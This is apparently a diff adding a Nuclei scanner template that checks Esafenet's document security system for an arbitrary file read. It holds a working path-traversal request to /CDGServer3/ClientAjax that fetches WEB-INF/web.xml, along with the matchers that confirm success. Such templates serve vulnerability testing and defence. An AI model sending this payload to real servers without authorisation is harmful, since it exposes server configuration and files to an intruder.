@@ -1,0 +1,28 @@
+http:
+    - matchers:
+        - status:
+            - 200
+          type: status
+        - part: body
+          type: word
+          words:
+            - <servlet-name>CDGPermissions</servlet-name>
+      matchers-condition: and
+      raw:
+        - |
+          POST /CDGServer3/ClientAjax  HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+          Content-Type: application/x-www-form-urlencoded
+
+          command=downclientpak&InstallationPack=../WEB-INF/web.xml&forward=index.jsp
+id: esafenet-client-ajax-download
+info:
+    author: SleepingBag945
+    description: 亿赛通电子文档安全系统 ClientAjax 任意文件读取
+    name: 亿赛通电子文档安全系统 ClientAjax 任意文件读取
+    reference:
+        - https://github.com/capiton0/templates/blob/63af3f97c9a5a5b86416ce7c0d62a8adae7b4a07/1.other-pocs/yisaitong-fileDownload.yaml#L12
+    severity: high
+    tags:
+        - Servlet
